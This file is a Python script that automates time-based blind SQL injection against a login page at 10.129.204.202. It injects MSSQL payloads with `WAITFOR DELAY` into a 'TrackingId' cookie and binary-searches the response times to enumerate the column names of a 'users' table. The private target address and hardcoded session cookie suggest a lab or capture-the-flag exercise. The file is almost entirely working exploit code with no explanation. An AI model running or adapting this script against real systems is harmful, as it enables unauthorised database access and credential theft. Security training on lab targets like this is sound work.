import requests
import time
import urllib.parse

def binary_search_number(min_val, max_val, target_url, cookies, query_template):
    while min_val <= max_val:
        mid_val = (min_val + max_val) // 2
        sqli_payload = urllib.parse.quote(query_template.format(mid_val=mid_val))
        cookies_injected = cookies.copy()
        cookies_injected["TrackingId"] = sqli_payload

        start_time = time.time()
        response = requests.post(target_url, cookies=cookies_injected, data={"e": "test@mail.com", "p": "fff"}, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
        elapsed_time = time.time() - start_time

        if elapsed_time >= 10:
            return mid_val
        else:
            sqli_payload = urllib.parse.quote(query_template.replace("= {mid_val}", "> {mid_val}").format(mid_val=mid_val))
            cookies_injected["TrackingId"] = sqli_payload

            start_time = time.time()
            response = requests.post(target_url, cookies=cookies_injected, data={"e": "test@mail.com", "p": "fff"}, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
            elapsed_time = time.time() - start_time

            if elapsed_time >= 10:
                min_val = mid_val + 1
            else:
                max_val = mid_val - 1

    return None

def binary_search_string(length, target_url, cookies, query_template):
    extracted_string = ""
    for position in range(1, length + 1):
        low, high = 32, 126
        char_found = False
        while low <= high:
            mid = (low + high) // 2
            sqli_payload = urllib.parse.quote(query_template.format(position=position, mid_char=mid))
            cookies_injected = cookies.copy()
            cookies_injected["TrackingId"] = sqli_payload

            start_time = time.time()
            response = requests.post(target_url, cookies=cookies_injected, data={"e": "test@mail.com", "p": "fff"}, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
            elapsed_time = time.time() - start_time

            if elapsed_time >= 10:
                extracted_string += chr(mid)
                char_found = True
                print(f"Found character: {chr(mid)} at position {position}")
                break
            else:
                sqli_payload = urllib.parse.quote(query_template.replace("= {mid_char}", "> {mid_char}").format(position=position, mid_char=mid))
                cookies_injected["TrackingId"] = sqli_payload

                start_time = time.time()
                response = requests.post(target_url, cookies=cookies_injected, data={"e": "test@mail.com", "p": "fff"}, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}, verify=False)
                elapsed_time = time.time() - start_time

                if elapsed_time >= 10:
                    low = mid + 1
                else:
                    high = mid - 1

        if not char_found:
            raise Exception(f"No valid character found at position {position}. Exiting.")

    return extracted_string

def enumerate_columns(target_url, cookies, table_name):
    print(f"[+] Enumerating columns for table: {table_name}")

    # Get the number of columns
    query_template_column_count = (
        f"test'; IF ((SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_name}') = {{mid_val}}) WAITFOR DELAY '0:0:10' --"
    )
    column_count = binary_search_number(1, 100, target_url, cookies, query_template_column_count)

    if not column_count:
        print("[-] Unable to determine column count.")
        return

    print(f"[+] Number of columns: {column_count}")

    # Enumerate column names
    for i in range(column_count):
        print(f"[+] Fetching column {i + 1}/{column_count}...")

        # Get column name length
        query_template_column_length = (
            f"test'; IF (LEN((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_name}' "
            f"ORDER BY COLUMN_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)) = {{mid_val}}) WAITFOR DELAY '0:0:10' --"
        )
        column_name_length = binary_search_number(1, 100, target_url, cookies, query_template_column_length)

        if not column_name_length:
            print(f"[-] Unable to determine length of column {i + 1}.")
            continue

        print(f"[+] Column name length: {column_name_length}")

        # Extract column name
        query_template_column_name = (
            f"test'; IF (ASCII(SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_name}' "
            f"ORDER BY COLUMN_NAME OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY), {{position}}, 1)) = {{mid_char}}) WAITFOR DELAY '0:0:10' --"
        )
        column_name = binary_search_string(column_name_length, target_url, cookies, query_template_column_name)

        print(f"[+] Column name: {column_name}")

def main():
    target_url = "http://10.129.204.202/login.php"
    cookies = {
        "PHPSESSID": "g6ke688tbpf8v9reniabgqobnr",
        "TrackingId": "000caaa93c8ccaa71e0b8fbeb33eb9b1"
    }

    table_name = "users"  # Replace with the table name you want to enumerate
    enumerate_columns(target_url, cookies, table_name)

if __name__ == "__main__":
    main()
